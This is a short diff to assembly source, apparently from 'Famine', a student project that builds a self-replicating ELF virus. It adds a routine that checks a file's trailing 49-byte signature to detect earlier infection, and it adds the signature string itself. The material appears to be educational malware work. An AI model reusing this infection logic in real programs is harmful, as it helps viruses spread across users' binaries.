@@ -3,6 +3,7 @@
 				extern			sc_check_infection
 				extern			sc_test_elf_hdr
 				extern			sc_write_mem
+				extern			sc_str_n_cmp
 
 				default			rel
 sc:
@@ -285,6 +286,32 @@ sc_find_txt_seg:
  .error:
  				mov				rax,					-1
 				ret
+sc_check_infection:
+				push			rbp
+				mov				rbp,					rsp
+				mov				r8,						qword[sc_glob]
+
+				cmp				qword[r8+0x18],			49
+				jb				.error
+
+				mov				rdi,					qword[r8+0xc60]
+				add				rdi,					qword[r8+0x18]
+				sub				rdi,					49
+
+				lea				rsi,					[sc_sign]
+				
+				mov				rdx,					49
+				call			sc_str_n_cmp
+
+				cmp				rax,					0
+				jne				.end
+
+ .error:
+ 				mov				rax,					-1
+ .end:
+ 				mov				rsp,					rbp
+				pop				rbp
+				ret
 sc_end:
 
 sc_data:
@@ -296,6 +323,8 @@ sc_entry:
 				dq				sc
 sc_real_entry:
 				dq				sc_first_real_entry
+sc_sign:
+				db				"Famine (42 project) - 2022 - by apitoise & fcadet", 0
 sc_glob:
 				dq				0	; +0x18 -> sz.mem
 									; +0x20 -> sz.code
